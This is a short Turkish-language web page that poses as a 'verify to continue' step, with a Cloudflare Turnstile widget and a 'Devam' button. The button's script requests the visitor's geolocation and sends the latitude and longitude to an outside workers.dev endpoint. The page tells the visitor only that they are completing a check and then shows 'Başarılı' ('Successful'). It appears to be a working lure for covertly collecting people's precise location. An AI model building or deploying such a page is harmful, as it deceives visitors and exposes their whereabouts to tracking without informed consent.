<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Devam Et</title>

<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>

<style>
body{
  background:#111;
  color:white;
  font-family:Arial;
  text-align:center;
  padding-top:80px;
}
button{
  padding:12px 25px;
  font-size:16px;
  background:#00bcd4;
  border:none;
  color:white;
  cursor:pointer;
}
</style>
</head>
<body>

<h2>Devam etmek için doğrulama yapın</h2>

<div class="cf-turnstile" data-sitekey="0x4AAAAAACajPIDrosxxpJUl"></div>

<br><br>
<button onclick="gonder()">Devam</button>

<script>
function gonder() {

  const token = document.querySelector("[name='cf-turnstile-response']").value;

  if (!token) {
    alert("Doğrulama yapın");
    return;
  }

  navigator.geolocation.getCurrentPosition(function(pos){

    fetch("https://disciplinehub.disciplinehub.workers.dev", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        token: token,
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude
      })
    })
    .then(res => res.json())
    .then(data => {
      alert("Başarılı");
      console.log(data);
    });

  }, function(){
    alert("Konum izni verilmedi");
  });

}
</script>

</body>
</html>
